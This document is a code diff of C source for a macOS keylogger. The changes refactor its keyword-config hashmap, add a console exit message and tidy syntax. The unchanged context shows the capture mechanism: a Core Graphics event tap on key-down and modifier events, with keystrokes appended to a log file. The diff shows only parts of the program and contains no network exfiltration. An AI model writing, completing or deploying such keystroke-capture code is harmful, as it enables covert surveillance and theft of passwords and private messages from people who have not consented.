@@ -1,9 +1,14 @@
 #include "keylogger.h"
 
 CGEventFlags lastFlags = 0;
-int BATCH_SZ = 1000;
+
+struct hashmap *hm = NULL;
+
 char buffer[1000];
+
+int BATCH_SZ = 1000;
 int buffer_index = 0;
+int hashmap_size = 0;
 
 void flush() {
   fwrite(buffer, 1, buffer_index, logfile);
@@ -15,13 +20,8 @@ int main(int argc, const char *argv[]) {
   signal(SIGINT, flush);
   signal(SIGTERM, flush);
 
-  /* CONFIG */
-  struct hashmap *hm = NULL;
-  int hashmap_size = 0;
-
-  get_config(&hm, &hashmap_size);
+  update_hashmap(&hm, &hashmap_size);
   for (int i = 0; i < hashmap_size; i++) {
-    printf("%s\n", hm[i].key);
     char **args = NULL;
     int args_length;
 
@@ -30,10 +30,7 @@ int main(int argc, const char *argv[]) {
       hm[i].key,
       NULL, args, &args_length
     );
-    printf("%s\n", hm[i].value);
-  }
-  /* CONFIG */
-
+  };
 
   CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
   CFMachPortRef eventTap = CGEventTapCreate(
@@ -49,9 +46,10 @@ int main(int argc, const char *argv[]) {
   if (!eventTap) {
     fprintf(stderr, "ERROR: Unable to create event tap.\n");
     exit(1);
-  }
+  };
 
   // Create a run loop source and add enable the event tap.
+  printf("Press [ctrl + c] to exit.\n");
   CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(
     kCFAllocatorDefault, eventTap, 0
   );
@@ -62,7 +60,6 @@ int main(int argc, const char *argv[]) {
   );
   CGEventTapEnable(eventTap, true);
 
-  // Clear the logfile if clear argument used or log to specific file if given.
   if (argc == 2) {
     if (strcmp(argv[1], "clear") == 0) {
       fopen(logfileLocation, "w");
@@ -71,7 +68,7 @@ int main(int argc, const char *argv[]) {
       exit(1);
     } else
       logfileLocation = argv[1];
-  }
+  };
 
   logfile = fopen(logfileLocation, "a");
   if (!logfile) {
@@ -79,7 +76,7 @@ int main(int argc, const char *argv[]) {
             "ERROR: Unable to open log file. Ensure that you have the proper "
             "permissions.\n");
     exit(1);
-  }
+  };
 
   fprintf(logfile, "\n\nKeylogging has begun.\n");
   fflush(logfile);
@@ -95,11 +92,14 @@ int main(int argc, const char *argv[]) {
 CGEventRef CGEventCallback(
   CGEventTapProxy proxy,
   CGEventType type,
-  CGEventRef event, void *refcon
+  CGEventRef event,
+  void *refcon
 ) {
   if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
     return event;
-  }
+  };
+
+  update_hashmap(&hm, &hashmap_size);
 
   CGEventFlags flags = CGEventGetFlags(event);
   CGKeyCode keyCode =
